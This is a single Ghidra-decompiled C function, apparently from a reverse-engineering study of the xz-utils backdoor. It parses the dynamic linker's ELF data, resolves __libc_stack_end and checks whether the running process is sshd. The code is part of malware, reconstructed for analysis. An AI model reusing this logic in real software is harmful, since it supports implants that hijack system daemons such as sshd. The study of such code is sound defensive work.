// /home/kali/xzre-ghidra/xzregh/103CE0_main_elf_parse.c
// Function: main_elf_parse @ 0x103CE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall main_elf_parse(main_elf_t * main_elf)


BOOL main_elf_parse(main_elf_t *main_elf)

{
  BOOL BVar1;
  Elf64_Sym *libc_stack_end_sym;
  uchar *puVar2;
  elf_info_t *dynamic_linker;
  
  BVar1 = elf_parse(main_elf->dynamic_linker_ehdr,main_elf->elf_handles->dynamic_linker);
  if ((BVar1 != 0) &&
     (libc_stack_end_sym =
           (Elf64_Sym *)
           elf_symbol_get(main_elf->elf_handles->dynamic_linker,STR_libc_stack_end,STR_GLIBC_2_2_5),
     libc_stack_end_sym != (Elf64_Sym *)0x0)) {
    dynamic_linker = main_elf->elf_handles->dynamic_linker;
    puVar2 = dynamic_linker->elfbase->e_ident + libc_stack_end_sym->st_value;
    BVar1 = process_is_sshd(dynamic_linker,*(u8 **)puVar2);
    if (BVar1 != 0) {
      *main_elf->__libc_stack_end = *(void **)puVar2;
      return 1;
    }
  }
  return 0;
}

